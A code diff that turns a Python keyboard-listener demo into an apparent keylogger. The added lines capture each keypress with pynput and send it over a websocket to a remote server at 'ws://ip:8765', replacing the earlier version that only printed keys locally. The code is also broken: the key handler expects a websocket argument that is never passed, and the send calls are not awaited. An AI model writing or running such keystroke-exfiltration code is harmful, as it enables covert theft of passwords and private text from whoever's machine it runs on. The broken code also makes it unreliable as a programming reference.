@@ -1,38 +1,29 @@
+from pynput import keyboard
 import asyncio
 import websockets
-from pynput import keyboard
 
-try:
-    uri = "ip:8765"
-    async websockets.connect(uri) as websocket:
+async def connect_to_websocket():
+    uri = "ws://ip:8765"
+    async with websockets.connect(uri) as websocket:
+        # Collect events until released
+        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+            listener.join()
 
+        # ...or, in a non-blocking fashion:
+        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+        listener.start()
 
-
-except:
-    exit
-def on_press(key, injected):
+def on_press(key, websocket, injected):
     try:
-        print('alphanumeric key {} pressed; it was {}'.format(
-            key.char, 'faked' if injected else 'not faked'))
+        websocket.send(key.char)
     except AttributeError:
-        print('special key {} pressed'.format(
-            key))
+        websocket.send(key)
 
 def on_release(key, injected):
-    print('{} released; it was {}'.format(
-        key, 'faked' if injected else 'not faked'))
     if key == keyboard.Key.esc:
         # Stop listener
         return False
 
-# Collect events until released
-with keyboard.Listener(
-        on_press=on_press,
-        on_release=on_release) as listener:
-    listener.join()
 
-# ...or, in a non-blocking fashion:
-listener = keyboard.Listener(
-    on_press=on_press,
-    on_release=on_release)
-listener.start()
+if __name__ == "__main__":
+    asyncio.run(connect_to_websocket())
